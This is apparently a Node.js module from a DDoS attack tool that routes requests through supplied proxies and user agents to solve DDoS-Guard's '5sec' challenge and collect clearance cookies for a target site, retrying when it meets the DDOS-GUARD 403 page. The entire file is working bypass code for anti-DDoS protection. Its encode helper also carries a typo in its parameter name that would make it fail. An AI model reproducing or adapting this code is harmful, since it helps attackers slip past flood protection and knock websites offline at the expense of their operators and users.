const request = require('request'),
    X = require('../x');

function encode(tring) {
    return Buffer.from(string).toString('base64');
}

var hS, uS, pS;
hS = encode(X._.parsed.protocol + '//' + X._.parsed.host);
uS = encode(X._.parsed.path);
pS = encode(X._.parsed.port || '');

module.exports = function(proxy, uagent, callback, force, cookie) {
    if (!cookie) {
        cookie = '';
    }
    if (['5sec', 'free'].indexOf(X._.firewall[1]) !== -1 || force) {
        request.get({
            url: X._.parsed.protocol + '//ddgu.ddos-guard.net/g',
            gzip: true,
            proxy: 'http://' + proxy,
            headers: {
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': 1,
                'User-Agent': uagent,
                'Accept': 'image/webp,*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US;q=0.9',
                'Referer': X._.address,
                'Origin': X._.parsed.protocol + '//' + X._.parsed.host
            }
        }, (err, res, body) => {
            if (err || !res || !body) {
                return false;
            }

            request.get({
                url: X._.parsed.protocol + '//ddgu.ddos-guard.net/c',
                gzip: true,
                proxy: 'http://' + proxy,
                headers: {
                    'Connection': 'Keep-Alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent,
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Referer': X._.parsed.protocol + '//' + X._.parsed.host + '/',
                    Origin: X._.parsed.protocol + '//' + X._.parsed.host,
                    'Accept-Language': 'en-US;q=0.9'
                }
            }, (err, res, body) => {
                if (err || !res || !body) {
                    return false;
                }

                request.post({
                    url: X._.parsed.protocol + '//ddgu.ddos-guard.net/ddgu/',
                    gzip: true,
                    proxy: 'http://' + proxy,
                    jar: true,
                    followAllRedirects: true,
                    headers: {
                        'Connection': 'Keep-Alive',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': 1,
                        'User-Agent': uagent,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Encoding': 'gzip, deflate, br',
                        "Referer": X._.parsed.protocol + '//' + X._.parsed.host + '/',
                        'Accept-Language': 'en-US;q=0.9'
                    },
                    form: {
                        u: uS,
                        h: hS,
                        p: pS
                    }
                }, (err, res, body) => {
                    if (err || !res || !body) {
                        return false;
                    }
                    callback(res.request.headers.cookie);
                });
            });
        });
    } else {
        request.get({
            url: X._.address,
            gzip: true,
            proxy: 'http://' + proxy,
            jar: true,
            followAllRedirects: true,
            headers: {
                'Connection': 'Keep-Alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': 1,
                'User-Agent': uagent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US;q=0.9'
            }
        }, (err, res, body) => {
            if (err || !res || !body) {
                return false;
            }
            if (res.request.headers.cookie) {
                callback(res.request.headers.cookie);
            } else {
                if (res.statusCode == 403 && body.indexOf("<title>DDOS-GUARD</title>") !== -1) {
                    return module.exports(proxy, uagent, callback, true);
                } else {
                    return false;
                }
            }
        });
    }
}